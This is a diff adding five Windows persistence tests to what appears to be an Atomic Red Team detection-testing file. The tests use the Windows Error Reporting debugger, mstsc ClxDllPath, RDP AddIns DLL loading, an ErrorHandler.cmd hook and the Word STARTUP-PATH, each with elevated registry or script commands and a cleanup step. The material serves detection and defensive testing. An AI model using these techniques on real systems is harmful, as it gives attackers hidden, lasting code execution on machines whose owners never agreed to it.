@@ -122,3 +122,88 @@ atomic_tests:
         # Clean up the CIM session
         Remove-CimSession -CimSession $CimSession 
 
+- name: Adding custom debugger for Windows Error Reporting
+  auto_generated_guid: 17d1a3cc-3373-495a-857a-e5dd005fb302
+  description: |
+    When applications hang, the Windows Error Reporting framework allows us to attach a debugger, if it is set up in the Registry.
+    Adding executable of choice will let the executable to auto-execute when during any application crash due to functioning of WER framework
+  supported_platforms:
+  - windows  
+  executor:
+    command: |
+      reg add "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
+    cleanup_command: |
+      reg delete "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /f
+    name: command_prompt
+    elevation_required: true
+- name: Load custom DLL on mstsc execution
+  auto_generated_guid: 2db7852e-5a32-4ec7-937f-f4e027881700
+  description: |
+    Adding ClxDllPath under Terminal Server Client subkey of HKLM hive with a path to custom DLL allows for DLL loading during execution of mstsc.exe
+  supported_platforms:
+  - windows
+  input_arguments:
+    dll_inf:
+      description: custom DLL to be executed
+      type: Path
+      default: 'C:\Windows\System32\amsi.dll'      
+  executor:
+    command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /t REG_SZ /d "#{dll_inf}" /f
+    cleanup_command: |-
+      reg delete "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /f      
+    name: command_prompt
+    elevation_required: true
+
+- name: Persistence using automatic execution of custom DLL during RDP session
+  auto_generated_guid: b7fc4c3f-fe6e-479a-ba27-ef91b88536e3
+  description: |-
+    When remote desktop session is accepted, the system queries the key it queries the Registry key:HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin. 
+    If such key exists, the OS will attempt to read the Path value underneath.Once the Path is read, the DLL that it points to will be loaded via LoadLibrary.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin" /v Path /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
+    cleanup_command: |-
+      reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin" /f
+    name: command_prompt
+    elevation_required: true
+- name: Persistence via ErrorHandler.cmd script execution
+  auto_generated_guid: 547a4736-dd1c-4b48-b4fe-e916190bb2e7
+  description: |
+    Create persistence by triggering script within ErrorHandler.cmd upon the execution of specific binaries within the oobe directory.
+    Upon test execution, Setup.exe will be executed to further execute script within ErrorHandlercmd to launch Notepad.
+  supported_platforms:
+  - windows
+  dependencies:
+  - description: |
+      ErrorHandler.cmd script must exist on disk at specified at PathToAtomicsFolder\T1546\bin\ErrorHandler.cmd
+    prereq_command: |
+      if (Test-Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd) { exit 0} else { exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\T1546\src\" -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/src/ErrorHandler.cmd" -OutFile "PathToAtomicsFolder\T1546\src\ErrorHandler.cmd"      
+  executor:
+    command: |
+      Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd
+      C:\windows\System32\oobe\Setup
+    cleanup_command: |-
+      Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd      
+    name: powershell
+    elevation_required: true
+- name: Persistence using STARTUP-PATH in MS-WORD
+  auto_generated_guid: f0027655-25ef-47b0-acaf-3d83d106156c
+  description: |-
+    When Word starts, it searches for the registry key HKCU\Software\Microsoft\Office\<version>\Word\Options\STARTUP-PATH and if it exists,
+    it will treat it as a user specific start-up folder and load the contents of the folder with file extensions of .wll,.lnk,.dotm,.dot,.dotx
+    The registry key can be abused to load malware from the mentioned path. Reboot might be required.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      reg add "HKCU\Software\Microsoft\Office\16.0\Word\Options" /v STARTUP-PATH /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent" /f
+    cleanup_command: |-
+      reg delete HKCU\Software\Microsoft\Office\16.0\Word\Options /v STARTUP-PATH /f
+    name: command_prompt
+    elevation_required: true
